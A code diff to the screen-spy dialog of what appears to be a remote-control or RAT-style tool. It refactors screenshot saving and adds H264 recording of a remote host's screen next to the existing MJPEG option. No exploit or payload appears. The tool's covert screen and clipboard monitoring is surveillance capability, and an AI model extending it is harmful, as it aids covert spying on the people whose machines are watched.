@@ -12,6 +12,8 @@
 #define new DEBUG_NEW
 #endif
 
+#define TIMER_ID 132
+
 /////////////////////////////////////////////////////////////////////////////
 // CHideScreenSpyDlg dialog
 enum {
@@ -33,9 +35,13 @@ enum {
     IDM_FPS_20,
     IDM_FPS_25,
     IDM_FPS_30,
+    IDM_SAVEAVI_H264 = 996, 
 };
 
 IMPLEMENT_DYNAMIC(CHideScreenSpyDlg, CDialog)
+
+bool DirectoryExists(const char* path);
+std::string GetScreenShotPath(CWnd* parent, const CString& ip, const CString& filter, const CString& suffix);
 
 CHideScreenSpyDlg::CHideScreenSpyDlg(CWnd* pParent, Server* pIOCPServer, ClientContext* pContext)
     : DialogBase(CHideScreenSpyDlg::IDD, pParent, pIOCPServer, pContext, IDI_SCREENSYP)
@@ -61,11 +67,7 @@ CHideScreenSpyDlg::~CHideScreenSpyDlg()
     m_ContextObject->GetServer()->Disconnect(m_ContextObject);
     DestroyIcon(m_hIcon);
     Sleep(200);
-    if (!m_aviFile.IsEmpty()) {
-        KillTimer(132);
-        m_aviFile = "";
-        m_aviStream.Close();
-    }
+
     ::ReleaseDC(m_hWnd, m_hFullDC);
     DeleteDC(m_hFullMemDC);
     DeleteObject(m_BitmapHandle);
@@ -95,6 +97,11 @@ END_MESSAGE_MAP()
 // CHideScreenSpyDlg message handlers
 void CHideScreenSpyDlg::OnClose()
 {
+	if (!m_aviFile.IsEmpty()) {
+		KillTimer(TIMER_ID);
+		m_aviFile = "";
+		m_aviStream.Close();
+	}
     CancelIO();
     // 等待数据处理完毕
     if (IsProcessing()) {
@@ -137,33 +144,13 @@ void CHideScreenSpyDlg::OnReceiveComplete()
 
 bool CHideScreenSpyDlg::SaveSnapshot()
 {
-    CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
-    CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
-    if (dlg.DoModal() != IDOK)
-        return false;
+	auto path = GetScreenShotPath(this, m_IPAddress, "位图文件(*.bmp)|*.bmp|", "bmp");
+	if (path.empty())
+		return FALSE;
 
-    BITMAPFILEHEADER	hdr;
-    LPBITMAPINFO		lpbi = m_BitmapInfor_Full;
-    CFile	file;
-    if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate)) {
-        MessageBox(_T("文件保存失败:\n") + dlg.GetPathName(), "提示");
-        return false;
-    }
-    // BITMAPINFO大小
-    int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
-    // Fill in the fields of the file header
-    hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
-    hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
-    hdr.bfReserved1 = 0;
-    hdr.bfReserved2 = 0;
-    hdr.bfOffBits = sizeof(hdr) + nbmiSize;
-    // Write the file header
-    file.Write(&hdr, sizeof(hdr));
-    file.Write(lpbi, nbmiSize);
-    // Write the DIB header and the bits
-    file.Write(m_BitmapData_Full, lpbi->bmiHeader.biSizeImage);
-    file.Close();
-    return true;
+	WriteBitmap(m_BitmapInfor_Full, m_BitmapData_Full, path.c_str());
+
+	return true;
 }
 
 BOOL CHideScreenSpyDlg::OnInitDialog()
@@ -185,7 +172,8 @@ BOOL CHideScreenSpyDlg::OnInitDialog()
         pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
         pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
         pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("保存录像(&A)"));
+        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("录像(MJPEG)"));
+        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_H264, _T("录像(H264)"));
         pSysMenu->AppendMenu(MF_SEPARATOR);
         pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
         pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
@@ -463,35 +451,28 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
     case IDM_SAVEDIB:
         SaveSnapshot();
         break;
-    case IDM_SAVEAVI_S: {
-
+    case IDM_SAVEAVI_S: case IDM_SAVEAVI_H264: {
         if (pSysMenu->GetMenuState(IDM_SAVEAVI_S, MF_BYCOMMAND) & MF_CHECKED) {
-            KillTimer(132);
+            KillTimer(TIMER_ID);
             pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_UNCHECKED);
+            pSysMenu->EnableMenuItem(IDM_SAVEAVI_S, MF_ENABLED);
+            pSysMenu->EnableMenuItem(IDM_SAVEAVI_H264, MF_ENABLED);
             m_aviFile = "";
             m_aviStream.Close();
-
             return;
         }
-
-        if (m_BitmapInfor_Full->bmiHeader.biBitCount <= 15) {
-            MessageBox(_T("不支持16位及以下颜色录像!"), "提示");
-            return;
-        }
-
-        CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
-        CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
-        if (dlg.DoModal() != IDOK)
-            return;
-
-        m_aviFile = dlg.GetPathName();
-
-        if (!m_aviStream.Open(m_hWnd, m_aviFile, m_BitmapInfor_Full)) {
-            MessageBox(_T("Create Video(*.avi) Failed:\n") + m_aviFile, "提示");
+        m_aviFile = GetScreenShotPath(this, m_IPAddress, "Video(*.avi)|*.avi|", "avi").c_str();
+		const int duration = 250, rate = 1000 / duration;
+		FCCHandler handler = nID == IDM_SAVEAVI_S ? ENCODER_MJPEG : ENCODER_H264;
+		int code;
+        if (code = m_aviStream.Open(m_aviFile, m_BitmapInfor_Full, rate, handler)) {
+            MessageBox(CString("Create Video(*.avi) Failed:\n") + m_aviFile + "\r\n错误代码: " + 
+                CBmpToAvi::GetErrMsg(code).c_str(), "提示");
             m_aviFile = _T("");
         } else {
-            ::SetTimer(m_hWnd, 132, 250, NULL);
-            pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_CHECKED);
+            ::SetTimer(m_hWnd, TIMER_ID, duration, NULL);
+            pSysMenu->CheckMenuItem(nID, MF_CHECKED);
+            pSysMenu->EnableMenuItem(nID == IDM_SAVEAVI_S ? IDM_SAVEAVI_H264 : IDM_SAVEAVI_S, MF_DISABLED);
         }
     }
     break;
@@ -886,7 +867,7 @@ void CHideScreenSpyDlg::OnTimer(UINT_PTR nIDEvent)
     if (!m_aviFile.IsEmpty()) {
         LPCTSTR	lpTipsString = _T("●");
 
-        m_aviStream.Write(m_BitmapData_Full);
+        m_aviStream.Write((BYTE*)m_BitmapData_Full);
 
         // 提示正在录像
         SetTextColor(m_hFullDC, RGB(0xff, 0x00, 0x00));
